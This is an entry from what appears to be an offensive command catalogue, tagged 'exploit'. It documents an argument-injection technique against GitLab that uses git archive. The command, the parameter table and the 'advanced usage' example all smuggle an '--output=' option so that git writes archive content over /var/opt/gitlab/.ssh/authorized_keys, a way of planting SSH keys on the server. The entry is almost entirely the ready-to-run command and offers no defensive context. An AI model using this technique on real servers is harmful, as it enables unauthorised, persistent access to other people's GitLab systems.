---
data: >-
  git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID
  --output=/var/opt/gitlab/.ssh/authorized_keys
tags:
  - exploit
type: command
executor: bash
platforms:
  - Linux
id: 349bac2f-ff9a-40ba-bbee-9e7f4f16a2d4
created_at: '2025-12-11T06:10:22.629Z'
updated_at: '2025-12-11T06:10:22.629Z'
verified: false
validated: true
submitted: true
---
# git-archive-injected

## Command

```bash
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

## Description

Executes git archive with injected '--output=' option to write archive content to a file on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--git-dir` | Specifies the repository directory | Yes |
| `--format` | Sets output format to tar | Yes |
| `--prefix` | Sets prefix for archived files | Yes |
| `--output` | Redirects output to the specified file path | Yes |
| `COMMIT_ID` | The commit to archive | Yes |

## Examples

### Basic Usage

```bash
git --git-dir=repo archive --format tar --prefix=/ HEAD --output=/tmp/test.tar
```

### Advanced Usage

```bash
git --git-dir=repo archive --format tar --prefix=/ HEAD --output=/var/opt/gitlab/.ssh/authorized_keys
```

## Expected Output

Writes the tar archive to '/var/opt/gitlab/.ssh/authorized_keys' instead of returning it.

## Related

- [[procedures/Trigger-Git-Archive-Download]]
